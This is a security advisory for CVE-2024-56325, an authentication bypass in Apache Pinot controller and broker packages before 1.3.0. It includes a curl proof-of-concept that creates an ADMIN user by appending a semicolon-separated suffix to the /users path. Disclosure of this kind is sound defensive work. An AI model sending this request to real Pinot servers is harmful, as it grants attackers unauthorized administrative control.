# Apache Pinot Vulnerable to Authentication Bypass

**GHSA**: GHSA-6jwp-4wvj-6597 | **CVE**: CVE-2024-56325 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-288

**Affected Packages**:
- **org.apache.pinot:pinot-broker** (maven): < 1.3.0
- **org.apache.pinot:pinot-common** (maven): < 1.3.0
- **org.apache.pinot:pinot-controller** (maven): < 1.3.0

## Description

Authentication Bypass Issue

If the path does not contain / and contain., authentication is not required.

Expected Normal Request and Response Example

curl -X POST -H "Content-Type: application/json" -d {\"username\":\"hack2\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}  http://{server_ip}:9000/users 


Return: {"code":401,"error":"HTTP 401 Unauthorized"}


Malicious Request and Response Example 

curl -X POST -H "Content-Type: application/json" -d '{\"username\":\"hack\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}'  http://{serverip}:9000/users; http://{serverip}:9000/users; .


Return: {"users":{}}



 

A new user gets added bypassing authentication, enabling the user to control Pinot.
